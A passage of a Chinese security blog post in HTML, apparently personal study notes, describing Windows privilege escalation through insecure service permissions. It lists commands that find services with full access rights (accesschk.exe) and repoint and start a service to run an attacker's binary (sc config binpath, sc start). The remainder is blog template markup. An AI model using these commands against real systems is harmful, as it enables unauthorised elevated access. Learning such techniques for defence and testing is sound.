+<h3 id="Win-不安全的服务"><a href="#Win-不安全的服务" class="headerlink" title="Win-&gt;不安全的服务"></a>Win-&gt;不安全的服务</h3><h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">原理：即使正确引用了服务路径，也可能存在其他漏洞。由于管理配置错误，用户可能对服务拥有过多的权限，例如，可以直接修改它导致重定向执行文件。<br></code></pre></td></tr></table></figure>
+
+<h5 id="检测-1"><a href="#检测-1" class="headerlink" title="检测"></a>检测</h5><p>运行脚本</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">1</span>.accesschk.exe -uwcqv <span class="hljs-string">&quot;administrators&quot;</span> *<br><br><span class="hljs-number">2</span>.找权限为“SERVICE_ALL_ACCESS”的服务<br><br><span class="hljs-number">3</span>.配置 sc config <span class="hljs-string">&quot;vds&quot;</span> binpath=<span class="hljs-string">&quot;C:\1.exe&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/image/image-20230430212113038.png" srcset="/img/loading.gif" lazyload alt="image-20230430212113038"></p>
+<h5 id="上线"><a href="#上线" class="headerlink" title="上线"></a>上线</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">sc</span> <span class="hljs-built_in">start</span> vds   手动启动上线/或者等待服务被调用上线<br></code></pre></td></tr></table></figure>
+
+<p><img src="/image/image-20230430211958854.png" srcset="/img/loading.gif" lazyload alt="image-20230430211958854"></p>
+<p><img src="/image/image-20230430212151767.png" srcset="/img/loading.gif" lazyload alt="image-20230430212151767"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" class="category-chain-item">网络安全</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/" class="print-no-link">#安全技术</a>
+      
+        <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="print-no-link">#学习笔记</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>权限提升win</div>
+      <div>http://example.com/2022/09/14/权限提升win/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>JUNYI</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2022年9月14日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/02/14/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/" title="mysql数据库提权">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">mysql数据库提权</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/03/14/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87_linux/" title="权限提升_linux">
+                        <span class="hidden-mobile">权限提升_linux</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <i class="iconfont icon-love"></i> <a href="/" target="_blank" rel="nofollow noopener"><span>JUNYI</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
